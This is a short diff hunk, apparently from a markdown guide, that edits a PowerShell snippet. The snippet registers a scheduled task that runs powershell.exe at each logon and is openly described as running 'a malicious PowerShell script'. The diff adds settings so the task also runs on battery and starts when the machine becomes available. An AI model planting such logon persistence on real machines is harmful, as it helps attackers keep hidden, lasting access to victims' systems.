@@ -56,6 +56,9 @@ $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $("-NoProf
 # Create a trigger to run the task at logon
 $Trigger = New-ScheduledTaskTrigger -AtLogOn
 
+# Create settings for the task
+$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+
 # Register the scheduled task
 Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Description "Runs a malicious PowerShell script at logon"
 ```
